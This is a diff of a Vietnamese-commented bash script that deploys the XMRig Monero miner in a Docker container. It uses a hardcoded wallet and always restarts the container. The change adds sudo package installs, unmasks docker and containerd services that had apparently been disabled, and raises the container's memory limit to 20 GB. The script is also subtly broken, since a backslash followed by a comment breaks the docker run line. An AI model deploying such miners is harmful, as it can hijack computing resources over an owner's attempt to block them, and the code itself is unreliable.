@@ -1,8 +1,9 @@
 #!/bin/bash
 
 # ========== KIỂM TRA PHỤ THUỘC ========== 
-command -v docker >/dev/null || { echo "❌ Docker chưa cài."; exit 1; } 
+command -v docker >/dev/null || { echo "❌ Docker chưa cài."; exit 1; }
 command -v curl >/dev/null || { echo "❌ curl chưa cài."; exit 1; }
+command -v bc >/dev/null || { echo "❌ bc chưa cài."; sudo apt-get install -y bc; }
 
 # ========== CẤU HÌNH ========== 
 WALLET=${WALLET:-85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz} 
@@ -17,12 +18,12 @@ XMRIG_ZIP_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.
 EXPECTED_SHA256="1d903d39c7e4e1706c32c44721d6a6c851aa8c4c10df1479478ee93cd67301bc"  # SHA256 chính xác của file tải về
 
 # ========== DỌN DẸP CŨ ========== 
-sudo su
-
-systemctl unmask docker
-systemctl unmask docker.socket
-systemctl unmask containerd.service
 docker rm -f "$CONTAINER_NAME" 2>/dev/null
+
+# ========== UNMASK DỊCH VỤ CẦN THIẾT ========== 
+sudo systemctl unmask docker
+sudo systemctl unmask docker.socket
+sudo systemctl unmask containerd.service
 
 # ========== TẠO THƯ MỤC TẠM ========== 
 WORKDIR=$(mktemp -d) 
@@ -86,7 +87,7 @@ docker build -t "$IMAGE_NAME" . || { echo "❌ Build thất bại"; exit 1; }
 # ========== RUN ========== 
 echo "[*] Chạy container '$CONTAINER_NAME'..." 
 docker run -d --name "$CONTAINER_NAME" \
-  --cpus="0.8" --memory="256m" \  # Điều chỉnh phần này nếu cần
+  --cpus="0.8" --memory="20000m" \  # Điều chỉnh phần này nếu cần
   --restart=always \
   --detach \
   --log-driver=syslog \
